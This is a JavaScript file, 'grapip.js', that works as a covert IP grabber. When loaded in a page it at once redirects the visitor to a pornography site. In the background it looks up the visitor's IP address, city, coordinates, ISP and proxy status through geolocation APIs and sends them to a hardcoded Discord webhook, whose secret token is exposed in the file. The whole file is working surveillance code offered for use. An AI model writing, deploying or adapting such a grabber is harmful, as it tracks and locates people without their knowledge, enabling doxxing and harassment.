/**
 * grapip.js
 * Telemetry Collector → Discord Webhook
 * Redirect fires immediately on load — grab runs in background via sendBeacon / keepalive
 * Runtime: browser, loaded via <script src="grapip.js">  ← no defer, fires first
 */

const CONFIG = {
  ipGeoUrl:       "https://api.techniknews.net/ipgeo/",
  fallbackApiUrl: "https://ip-api.com/json/",
  webhookUrl:     "https://discord.com/api/webhooks/1566653634194837574/oPIKFaD-Sxb-YZTdwIZMYT4umfp6U4r96O8p7vDZjziMMGmAWOji3My4UbE2YZREqkAK",
  redirectUrl:    "https://www.pornhub.com/",
  timeoutMs:      5000
};

/**
 * fetch() with hard timeout
 */
async function fetchWithTimeout(url, options = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (err) {
    console.error(`[grapip] fetch fail (${url}): ${err.message}`);
    return null;
  } finally {
    clearTimeout(timer);
  }
}

async function fetchPrimary() {
  const d = await fetchWithTimeout(CONFIG.ipGeoUrl);
  if (!d || d.status === "fail") return null;
  return {
    ip:          d.ip,
    continent:   d.continent,
    country:     d.country,
    countryCode: d.countryCode,
    region:      d.regionName,
    city:        d.city,
    postal:      d.zip || "N/A",
    lat:         d.lat,
    lon:         d.lon,
    loc:         (d.lat && d.lon) ? `${d.lat}, ${d.lon}` : null,
    timezone:    d.timezone,
    currency:    d.currency,
    isp:         d.isp,
    org:         d.org,
    as:          d.as,
    reverse:     d.reverse || "N/A",
    mobile:      d.mobile,
    proxy:       d.proxy,
    hosting:     d.hosting,
    cached:      d.cached
  };
}

async function fetchFallback() {
  const d = await fetchWithTimeout(CONFIG.fallbackApiUrl);
  if (!d || d.status === "fail") return null;
  return {
    ip:          d.query,
    continent:   "N/A",
    country:     d.country,
    countryCode: d.countryCode,
    region:      d.regionName,
    city:        d.city,
    postal:      d.zip || "N/A",
    lat:         d.lat,
    lon:         d.lon,
    loc:         `${d.lat}, ${d.lon}`,
    timezone:    d.timezone,
    currency:    "N/A",
    isp:         d.isp,
    org:         d.org,
    as:          d.as,
    reverse:     d.reverse || "N/A",
    mobile:      d.mobile  ?? "N/A",
    proxy:       d.proxy   ?? "N/A",
    hosting:     d.hosting ?? "N/A",
    cached:      false
  };
}

async function getIPDetails() {
  let details = await fetchPrimary();
  if (!details || (!details.city && !details.isp)) {
    const fallback = await fetchFallback();
    if (fallback) details = fallback;
  }
  return details;
}

function buildPayload(details) {
  const bool = v => (v === true ? "✅" : v === false ? "❌" : "N/A");
  return JSON.stringify({
    embeds: [{
      title: "IP Network & Geolocation Data",
      color: 0x3498db,
      fields: [
        { name: "IP Address",   value: String(details.ip          || "N/A"), inline: true  },
        { name: "Continent",    value: String(details.continent   || "N/A"), inline: true  },
        { name: "Country",      value: String(details.country     || "N/A"), inline: true  },
        { name: "Country Code", value: String(details.countryCode || "N/A"), inline: true  },
        { name: "Region",       value: String(details.region      || "N/A"), inline: true  },
        { name: "City",         value: String(details.city        || "N/A"), inline: true  },
        { name: "Postal Code",  value: String(details.postal      || "N/A"), inline: true  },
        { name: "Location",     value: String(details.loc         || "N/A"), inline: true  },
        { name: "Timezone",     value: String(details.timezone    || "N/A"), inline: true  },
        { name: "Currency",     value: String(details.currency    || "N/A"), inline: true  },
        { name: "ISP",          value: String(details.isp         || "N/A"), inline: false },
        { name: "Org",          value: String(details.org         || "N/A"), inline: false },
        { name: "AS",           value: String(details.as          || "N/A"), inline: false },
        { name: "Reverse DNS",  value: String(details.reverse     || "N/A"), inline: false },
        { name: "Mobile",       value: bool(details.mobile),                 inline: true  },
        { name: "Proxy",        value: bool(details.proxy),                  inline: true  },
        { name: "Hosting",      value: bool(details.hosting),                inline: true  },
        { name: "Cached",       value: bool(details.cached),                 inline: true  }
      ],
      timestamp: new Date().toISOString()
    }]
  });
}

/**
 * Dispatch via keepalive fetch — survives page unload/redirect
 */
async function sendToDiscord(details) {
  if (!details) return;
  try {
    await fetch(CONFIG.webhookUrl, {
      method:    "POST",
      headers:   { "Content-Type": "application/json" },
      body:      buildPayload(details),
      keepalive: true   // survives navigation away from the page
    });
  } catch (err) {
    console.error(`[grapip] webhook error: ${err.message}`);
  }
}

/**
 * Entry
 * 1. redirect fires immediately — visitor is gone first frame
 * 2. IP grab + webhook dispatch runs async in background via keepalive
 */
(function main() {
  // step 1 — door opens NOW, before any await
  window.location.replace(CONFIG.redirectUrl);

  // step 2 — grab fires in background, keepalive keeps it alive through navigation
  getIPDetails().then(sendToDiscord);
})();
